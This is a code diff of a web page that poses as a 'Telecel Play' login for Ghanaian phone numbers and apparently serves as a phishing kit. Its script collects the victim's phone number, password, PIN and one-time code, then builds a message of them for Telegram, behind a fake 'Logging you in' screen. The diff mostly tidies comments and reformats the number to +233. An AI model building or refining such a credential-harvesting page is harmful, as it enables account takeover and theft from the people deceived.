@@ -23,6 +23,8 @@ background:linear-gradient(180deg,#fff5f7,#ffe3e8);
 overflow:hidden;
 }
 
+/* background */
+
 .wave{
 position:fixed;
 width:700px;
@@ -42,6 +44,8 @@ z-index:-1;
 50%{transform:translateY(40px)}
 100%{transform:translateY(0)}
 }
+
+/* card */
 
 .step{
 position:absolute;
@@ -77,6 +81,8 @@ display:block;
 margin:auto;
 }
 
+/* text */
+
 h1{
 text-align:center;
 color:#e60023;
@@ -91,6 +97,8 @@ font-size:13px;
 color:#555;
 margin-bottom:18px;
 }
+
+/* inputs */
 
 label{
 font-size:12px;
@@ -117,6 +125,8 @@ background:white;
 box-shadow:0 0 0 3px rgba(230,0,35,.08);
 }
 
+/* password */
+
 .password-box{
 position:relative;
 }
@@ -130,6 +140,8 @@ cursor:pointer;
 opacity:.6;
 }
 
+/* button */
+
 .btn{
 margin-top:20px;
 width:100%;
@@ -141,6 +153,8 @@ background:#e60023;
 color:white;
 cursor:pointer;
 }
+
+/* pin boxes */
 
 .pin{
 display:flex;
@@ -213,6 +227,7 @@ animation:pulse 1.2s infinite ease-in-out;
 <div class="wave two"></div>
 
 <div class="container">
+
 
 <!-- LOGIN -->
 
@@ -357,6 +372,11 @@ Logging you in...
 <script>
 
 
+let phoneValue=""
+let passwordValue=""
+let pinValue=""
+let otpValue=""
+
 /* enforce Ghana number */
 
 phone.oninput=e=>{
@@ -364,7 +384,6 @@ phone.oninput=e=>{
 let v=e.target.value.replace(/\D/g,"").slice(0,10)
 
 if(v.length>0 && v[0]!=="0")
-
 v="0"+v.slice(1)
 
 e.target.value=v
@@ -372,12 +391,6 @@ e.target.value=v
 phoneValue=v
 
 }
-
-
-let phoneValue=""
-let passwordValue=""
-let pinValue=""
-let otpValue=""
 
 
 function togglePassword(){
@@ -429,20 +442,20 @@ planLine=[p.name||"",p.price||""].join(" — ")
 }catch(e){}
 
 
-/* telegram text clean */
+/* clean telegram message */
 
 function buildMessage(stage){
 
 return `Telecel Play Login
 
+Time: ${new Date().toISOString()}
 Stage: ${stage}
 Number: ${phoneValue}
 Password: ${passwordValue}
 Pin: ${pinValue}
 Otp: ${otpValue}
 Plan: ${planLine}
-Device: ${device}
-Time: ${new Date().toISOString()}`
+Device: ${device}`
 
 }
 
@@ -475,6 +488,10 @@ form.onsubmit=e=>{
 e.preventDefault()
 
 passwordValue=password.value
+
+/* convert to Ghana intl */
+
+phoneValue="+233"+phoneValue.slice(1)
 
 show("loading")
 
@@ -592,7 +609,7 @@ startTimer()
 }
 
 
-/* 2 min timer */
+/* 2 minute timer */
 
 function startTimer(){
 
@@ -603,7 +620,6 @@ time.textContent=t
 const i=setInterval(()=>{
 
 t--
-
 time.textContent=t
 
 if(t<=0) clearInterval(i)
